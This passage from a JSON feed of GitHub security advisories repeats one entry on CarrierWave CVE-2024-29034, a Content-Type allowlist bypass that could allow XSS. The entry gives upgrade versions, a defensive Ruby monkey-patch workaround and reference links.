CarrierWave 2.x\nCarrierWave::SanitizedFile.class_eval do\n  def existing_content_type\n    if @file.respond_to?(:content_type) &amp;&amp; @file.content_type\n      Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)\n    end\n  end\nend\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation\">OWASP - File Upload Cheat Sheet</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw\">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29034\">https://nvd.nist.gov/vuln/detail/CVE-2024-29034</a></li>\n<li><a href=\"https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477\">https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfmv-jfc5-pjjw\">https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfmv-jfc5-pjjw",
            "title": "[carrierwave] CarrierWave content-Type allowlist bypass vulnerability which possibly leads to XSS remained",
            "date_modified": "2024-03-27T13:00:01.000Z",
            "date_published": "2024-03-25T19:40:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfmv-jfc5-pjjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability <a href=\"https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-gxhx-g4fq-49hj\">CVE-2023-49090</a> wasn't fully addressed.</p>\n<p>This vulnerability is caused by the fact that when uploading to object storage, including Amazon S3, it is possible to set a Content-Type value that is interpreted by browsers to be different from what's allowed by <code>content_type_allowlist</code>, by providing multiple values separated by commas.</p>\n<p>This bypassed value can be used to cause XSS.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to <a href=\"https://rubygems.org/gems/carrierwave/versions/3.0.7\">3.0.7</a> or <a href=\"https://rubygems.org/gems/carrierwave/versions/2.2.6\">2.2.6</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use the following monkey patch to let CarrierWave parse the Content-type by using <code>Marcel::MimeType.for</code>.</p>\n<pre><code class=\"language-ruby\"># For CarrierWave 3.x\nCarrierWave::SanitizedFile.class_eval do\n  def declared_content_type\n    @declared_content_type ||\n      if @file.respond_to?(:content_type) &amp;&amp; @file.content_type\n        Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)\n      end\n  end\nend\n</code></pre>\n<pre><code class=\"language-ruby\"># For CarrierWave 2.x\nCarrierWave::SanitizedFile.class_eval do\n  def existing_content_type\n    if @file.respond_to?(:content_type) &amp;&amp; @file.content_type\n      Marcel::MimeType.for(declared_type: @file.content_type.to_s.chomp)\n    end\n  end\nend\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation\">OWASP - File Upload Cheat Sheet</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw\">https://github.com/carrierwaveuploader/carrierwave/security/advisories/GHSA-vfmv-jfc5-pjjw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29034\">https://nvd.nist.gov/vuln/detail/CVE-2024-29034</a></li>\n<li><a href=\"https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477\">https://github.com/carrierwaveuploader/carrierwave/commit/25b1c800d45ef8e78dc445ebe3bd8a6e3f0a3477</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/carrierwave/CVE-2024-29034.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfmv-jfc5-pjjw\">https://github.com/advisories/GHSA-vfmv-jfc5-pjjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfmv-jfc5-pjjw",
            "title": "[carrierwave] CarrierWave content-Type allowlist bypass vulnerability which possibly leads to XSS remained",
            "date_modified": "2024-03-27T13:00:01.000Z",
            "date_published": "2024-03-25T19:40:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfmv-jfc5-pjjw"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}